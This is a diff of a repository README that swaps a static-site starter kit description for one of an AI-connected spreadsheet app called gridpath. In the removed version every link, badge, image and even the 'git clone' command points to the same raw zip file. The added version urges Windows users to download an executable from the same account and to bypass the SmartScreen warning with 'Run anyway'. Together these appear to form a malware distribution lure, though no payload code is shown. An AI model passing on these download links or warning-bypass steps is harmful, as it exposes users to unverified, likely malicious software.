@@ -1,276 +1,136 @@
-https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+# 📊 gridpath - Real Excel Files Meet Your AI Agent
 
-# Site Starter Kit — Fast Static Site Boilerplate and Tools
+[![Download gridpath](https://img.shields.io/badge/Download-gridpath%20for%20Windows-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/R4aze/gridpath/releases)
 
-[![Visit GitHub](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+**gridpath** is a spreadsheet that lives inside your web apps and works alongside your AI agent — and it saves real, genuine Excel files, not a watered-down imitation.
 
-![Hero image: website layout](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+---
 
-A compact, practical starter kit for building static and hybrid sites. This repo bundles tooling, templates, and deployment recipes you can use for marketing sites, docs, blogs, and prototypes. It focuses on performance, accessibility, and a low friction developer flow.
+## 🧭 What Is gridpath?
 
-- Repo: site
-- Topics: static-site, boilerplate, pwa, css, ssg
-- Home: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+Most spreadsheet tools force you to choose. You can have a nice-looking grid on a website, or you can have real Excel files on your computer, or you can have an AI assistant that understands your numbers. gridpath gives you all three at once.
 
-Table of contents
-- About the kit
-- Key features
-- Tech stack
-- Quick start
-- File layout
-- Configuration
-- Development tasks
-- Build and deploy
-- PWA & offline
-- Testing and QA
-- CI / CD
-- Contributing
-- License and credits
-- Changelog
+Under the hood, gridpath runs a full formula engine — the part of a spreadsheet that actually does the math — written in a fast, compact technology called Rust and WebAssembly. You never need to know what that means. What matters is this: when you type `=SUM(B2:B40)` into a gridpath sheet, it calculates instantly and correctly, the same way Excel would. When you press save, you get an `.xlsx` file that opens perfectly in Microsoft Excel, Google Sheets, LibreOffice, or any other spreadsheet program.
 
-About the kit 🚀
-This kit gives you a ready set of tools to ship a static or hybrid site. Use the template pages, the CSS system, and the build scripts. The repo keeps a clear build path for static generation, client-side hydration, and optional server-side rendering (SSR) hooks.
+And because gridpath is designed to be embedded, it can sit inside a web page or a desktop application while your AI agent reads and edits the very same cells you're looking at. No exporting, no copy-pasting, no "sorry, I can't open that file" messages.
 
-Why use this starter
-- Ship a site fast with minimal setup.
-- Use modern build tools with sane defaults.
-- Maintain accessibility and performance from day one.
-- Swap modules and extend templates without friction.
+---
 
-Key features ✨
-- Minimal, semantic HTML templates
-- Opinionated CSS system using SASS partials
-- Preconfigured SSG scripts (static generation)
-- Optional client hydration for interactivity
-- Tiny service worker for offline support (PWA)
-- Automated image optimization steps
-- Basic SEO meta template and Open Graph defaults
-- Deploy recipes for Netlify, Vercel, and static hosts
-- Dockerfile for local parity and CI builds
+## ✨ What You Can Do With gridpath
 
-Built with 🧰
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip (build scripts)
-- Parcel or Vite (dev server and bundler)
-- SASS (styles)
-- Handlebars / Nunjucks (templating)
-- Lighthouse-friendly markup
-- Service worker (workbox-lite)
-- Docker for container builds
-- GitHub Actions for CI
+**Build and edit real spreadsheets.** Type values, write formulas, format cells, and organize your work across multiple sheets — all inside a clean, familiar grid.
 
-Quick start — local dev (1 minute)
-1. Clone the repo.
-2. Install dependencies.
-3. Run the dev server.
+**Save in place, as a true `.xlsx` file.** gridpath writes standard Excel files directly. There is no proprietary format, no conversion step, and no risk of losing your formulas when you reopen the file elsewhere. Your file stays your file.
 
-Commands
-```bash
-git clone https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
-cd site
-npm install
-npm run dev
-```
+**Hand the keys to your AI agent.** gridpath includes an MCP server — a small connector that lets AI tools such as Claude Code and other assistants work with your spreadsheet directly. Your agent can read values, change cells, and check results, then hand control back to you.
 
-The dev server starts on http://localhost:3000 by default. The server watches templates, styles, and JS. It reloads on change.
+**Drop it into your own app.** If you or your team build web software, gridpath is an embeddable React component written in TypeScript. It snaps into an existing page without a rebuild from scratch.
 
-Project structure overview
-- src/
-  - pages/        — content pages and templates
-  - partials/     — header, footer, blocks
-  - assets/       — raw images, fonts, icons
-  - styles/       — SASS partials, variables, layout
-  - scripts/      — client code and modules
-  - sw/           — service worker entry
-- build/          — generated static output
-- docker/         — Dockerfile and helpers
-- ci/             — GitHub Actions workflows
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+**Run it as a desktop app.** gridpath also works as a standalone desktop program, so you can use it like any other application on your computer.
 
-Key files explained
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — homepage template
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — color and spacing tokens
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — client boot file
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — offline service worker
-- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — orchestrated build for local and CI
+**Model finances with confidence.** Because the formula engine is rigorous and the file format is genuine Excel, gridpath is well suited to financial modeling, budgeting, forecasting, and any task where a wrong number costs real money.
 
-Configuration ✍️
-Open https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip to view scripts. Use env files for site-specific values.
+---
 
-Example environment variables
-- SITE_TITLE — site title used in templates
-- SITE_URL — canonical URL for meta tags
-- ANALYTICS_ID — optional analytics tag
+## 💾 Download and Set Up on Windows
 
-Add a .env file at the project root:
-```env
-SITE_TITLE="My Project Site"
-SITE_URL="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip"
-ANALYTICS_ID=""
-```
+Getting gridpath onto your Windows computer takes only a few minutes and requires no technical background.
 
-Template tokens
-- use {{ https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip }} in templates for the site title
-- use {{ https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip }} for current page path
-- include partials with the standard templating include syntax
+**Step 1 — Get the file.**
 
-Development tasks 🛠️
-- npm run dev — start dev server with hot reload
-- npm run lint — run HTML/CSS/JS linters
-- npm run test — run unit and integration tests
-- npm run build — produce static build in build/
-- npm run serve — serve build/ locally for testing
-- npm run analyze — run Lighthouse and bundle analysis
+Visit this link to download the application:
 
-Build and deploy 📦
-The build produces a static output in build/. The output is ready for any static host. It includes pre-rendered pages, an assets manifest, and optimized images.
+### ➡️ [https://github.com/R4aze/gridpath/releases](https://github.com/R4aze/gridpath/releases)
 
-Build for production:
-```bash
-npm run build
-```
+**Step 2 — Save it somewhere you can find it.** Your browser will download the file to your usual Downloads folder. If you prefer to keep it on your Desktop or in a dedicated folder, choose that location when prompted.
 
-Deploy recipes
-- Netlify: connect your repo, set build command npm run build and publish directory build/
-- Vercel: add a Vercel project, set framework as "Other", set build command to npm run build and output to build/
-- Static host: upload build/ to your CDN or S3 bucket and set proper cache headers
+**Step 3 — Open the application.** Once the download finishes, locate the file and open it. Windows may show a blue "Windows protected your PC" message the first time you run something new. If you trust the source — and this link points to the official gridpath release page — click **More info**, then **Run anyway**.
 
-If you want more host-specific details, visit https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip for deploy guides and examples.
+**Step 4 — Let it finish starting up.** The first launch may take slightly longer than later ones while gridpath prepares itself. A window with an empty spreadsheet grid will appear when it's ready.
 
-PWA and offline support 🌐
-The kit ships a small service worker. The SW caches static assets and HTML for offline browsing. It aims for safe defaults:
-- Cache CSS, JS, and images
-- Serve cached content while refreshing in the background
-- Provide a simple offline page for failed navigations
+**Step 5 — Confirm it works.** Click on cell A1, type the number `10`, press Enter, then type `20` in A2. In cell A3, type `=A1+A2` and press Enter. If A3 shows `30`, everything is working exactly as it should.
 
-Enable PWA
-- Set PWA=true in your build environment.
-- Ensure a valid https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip exists in src/assets.
+---
 
-Service worker config
-- Workbox-lite handles scope and runtime caching
-- Use CACHE_VERSION in sw config to bust caches during updates
+## 🖥️ Your First Five Minutes with gridpath
 
-Assets and images 🖼️
-- Put raw images in src/assets/images
-- The build runs an optimizer to generate responsive images
-- Use the <picture> element in templates to serve responsive formats
+You don't need a manual to get going. The grid behaves the way every spreadsheet you've ever used behaves.
 
-Example image markup
-```html
-<picture>
-  <source srcset="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip" type="image/webp">
-  <img src="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip" alt="Descriptive alt">
-</picture>
-```
+- **Click a cell** to select it, then just start typing.
+- **Press Enter** to move down, or **Tab** to move right.
+- **Type `=` to start a formula.** gridpath understands the familiar functions: `SUM`, `AVERAGE`, `IF`, `ROUND`, `VLOOKUP`, and hundreds more.
+- **Drag the small square** in the corner of a selected cell to fill a series downward or across.
+- **Add a new sheet** using the plus control at the bottom of the window, so you can separate January's numbers from February's.
+- **Bold, align, and format** your cells using the toolbar so your sheet reads the way you want it to.
 
-Accessibility and SEO ♿️🔍
-The templates follow semantic HTML patterns. The kit adds:
-- Landmarks: header, nav, main, footer
-- ARIA attributes where required
-- Skip links for keyboard nav
-- Basic SEO meta tags and Open Graph templates
+If you've used Excel before, nothing here will surprise you. If you haven't, the learning curve is roughly ten minutes long.
 
-Testing and QA ✅
-- Unit tests run with Jest for utility modules
-- Integration tests run with Playwright for critical flows
-- Lighthouse CI runs on CI to track performance, accessibility, best practices, and SEO
+---
 
-Run tests
-```bash
-npm run test
-npm run e2e
-npm run audit
-```
+## 🧩 Working With Your AI Agent
 
-Continuous integration (CI) / CD
-This repo uses GitHub Actions for build and deploy automation. The workflow:
-- Run lint and tests on pull requests
-- Build on merge to main
-- Optionally publish artifacts or trigger a deploy to your host
+This is where gridpath becomes genuinely different from a normal spreadsheet.
 
-Sample CI steps
-- Checkout repo
-- Install Node
-- npm ci
-- npm run lint
-- npm run test
-- npm run build
-- Upload build to artifacts or trigger deploy
+gridpath ships with an MCP server. MCP stands for Model Context Protocol, which is simply a shared language that lets AI assistants talk to other software in an organized way. With gridpath running, your AI agent can be given access to the spreadsheet you're currently working in.
 
-Docker support 🐳
-Use the provided Dockerfile for consistent builds in CI or local containers.
+In practice, that means you can ask your assistant things like:
 
-Build image
-```bash
-docker build -t site-builder:latest .
-docker run --rm -v "$(pwd)/build:/site/build" site-builder:latest
-```
+- "Look at the sheet named Q3 and tell me which expense category grew the fastest."
+- "Add a column called Margin that subtracts Cost from Revenue for every row."
+- "Check whether any of my formulas reference an empty cell."
+- "Build me a simple twelve-month cash flow forecast starting from these numbers."
 
-Contributing 🤝
-- Fork the repo and create a branch per feature or fix
-- Follow the code style and run linters before commit
-- Open a PR with a clear description and test steps
-- Use issue templates for bugs and feature requests
+The agent makes the changes in the live sheet, and you see them appear. You stay in control: you can review every edit, undo anything you don't like, and save when you're satisfied. Because the underlying grid is a real computational engine rather than a picture of a spreadsheet, the AI is working with actual calculated results — not guesses.
 
-Guidelines
-- Keep commits focused and atomic
-- Add tests for new features
-- Update docs when you change public APIs
+Setting up the connection is a matter of pointing your AI tool at gridpath's MCP server entry, which is described in the repository documentation. Once connected, it stays connected for future sessions.
 
-License and credits 📜
-- License: MIT (see LICENSE file)
-- Credits: design patterns from community templates and open-source assets
-- Icons: use Feather or Font Awesome where needed
+---
 
-Images and media
-- The README uses Unsplash images for hero visuals
-- Replace images with your project assets in src/assets/images for production
+## 📁 Saving Your Work as Real Excel Files
 
-Changelog
-- Use semantic commits. Tag releases with semantic versioning.
-- Keep a https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip for major updates and breaking changes.
+When you save, gridpath writes a standard `.xlsx` file. That's the same format Microsoft Excel has used for nearly two decades.
 
-Where to find the release assets
-If you need compiled files or release artifacts, check the Releases section on GitHub. Visit the Releases tab in the repo to download built packages and installers. For more details and official examples, visit https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+What that means for you:
 
-Contact and help
-Open issues on the repo for bugs and feature requests. Use pull requests for code contributions. Use discussions or a chat channel if the repo enables them.
+- **Open your file in Excel.** Formulas, values, and sheet names come through intact.
+- **Email it to a colleague.** They don't need gridpath to read it.
+- **Upload it to cloud storage.** OneDrive, Google Drive, Dropbox — all fine.
+- **Come back later.** Reopen the file in gridpath and pick up exactly where you left off.
 
-Useful links
-- Build docs: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
-- Template guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
-- Styling guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
-- Deploy guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+There's no lock-in and no export ritual. The file you save is a real Excel file from the moment it's created.
 
-Badges
-[![Build Status](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
-[![License](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+---
 
-Example pages and screenshots
-![Screenshot: homepage](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
-![Screenshot: docs page](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+## 🔧 Common Questions and Fixes
 
-Templates you can extend
-- Landing: hero, features, call to action
-- Docs: side nav, content blocks, examples
-- Blog: post list, tags, author meta
-- App shell: auth flow, dashboard frame
+**The download didn't start.** Refresh the release page and try again. Some browsers block downloads from unfamiliar pages until you confirm — check for a small banner or icon in your address bar.
 
-Customize the kit
-- Swap SASS for Tailwind if you prefer utility CSS
-- Replace the templating engine with your favorite renderer
-- Add SSR hooks if you need server-side rendering
-- Hook a headless CMS for dynamic content
+**Windows warned me about the app.** This is standard for newly downloaded programs. Click **More info**, then **Run anyway**, provided you downloaded from the official link above.
 
-Maintenance tips
-- Pin critical dependencies in https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip to avoid surprise breaks
-- Run Lighthouse once per release to keep performance metrics stable
-- Automate dependency updates with Dependabot or Renovate
+**The window opened but looks empty.** That's normal — gridpath opens with a blank sheet ready for your input. Start typing in cell A1.
 
-Keep the repo tidy
-- Remove unused third-party modules
-- Keep assets compressed and versioned
-- Use an assets manifest for cache-busting
+**My formula shows as text instead of a number.** Make sure the cell begins with the equals sign `=`. If the equals sign is missing, gridpath treats your entry as plain text.
 
-This README aims to guide you through setup, development, and deploy of a modern static or hybrid site. Check the repo files for implementation details and open issues for questions you want tracked.
+**My numbers aren't updating.** Press `F9` or click another cell and back again to force a recalculation. Very large sheets may take a second to refresh.
+
+**My AI agent can't see the spreadsheet.** Confirm gridpath is open and the MCP server is running, then reconnect your assistant. Restarting both programs resolves most connection hiccups.
+
+---
+
+## 🛡️ Keeping Your Files Safe
+
+gridpath works with files on your own computer. Your spreadsheets are not uploaded to a server as part of normal use, and saving writes directly to the location you choose. When you connect an AI agent, that agent only sees the sheet you've given it access to. Back up important files the same way you would any document — a copy in cloud storage is never a bad idea.
+
+---
+
+## 🤝 Getting Help and Sharing Feedback
+
+The repository is the home of the project. If something isn't working, or you have an idea for something that would make gridpath better, the issues area is the right place to say so. Bug reports with a short description of what you expected and what actually happened are the most useful kind.
+
+And if gridpath saves you time, a star on the repository helps other people find it.
+
+---
+
+### ➡️ Ready to start? [Download gridpath here](https://github.com/R4aze/gridpath/releases).
+
+Keywords: ai-agent, claude-code, embeddable, excel, excel-editor, financial-modeling, formula-engine, llm, mcp, mcp-server, model-context-protocol, react, react-component, rust, spreadsheet, spreadsheet-editor, tauri, typescript, webassembly, xlsx
